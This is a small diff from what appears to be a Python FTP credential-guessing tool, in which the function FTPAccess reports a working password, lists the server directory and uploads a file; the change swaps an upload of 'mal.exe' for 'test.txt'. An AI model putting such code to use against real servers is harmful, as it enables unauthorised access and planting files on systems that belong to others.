@@ -12,9 +12,9 @@ def FTPAccess(host, port, user, password):
         print("[+] Login to FTP Server success:", password) # Correct credentials
         print("[+] Listing FTP Directory")
         server.dir()
-        with open("mal.exe", "rb") as file:
+        with open("test.txt", "rb") as file:
             print("[+] Attempting to upload to FTP Directory")
-            server.storbinary(f"STOR {'mal.exe'}", file)
+            server.storbinary(f"STOR {'test.txt'}", file)
         server.dir()
         files = []
         files = server.nlst()
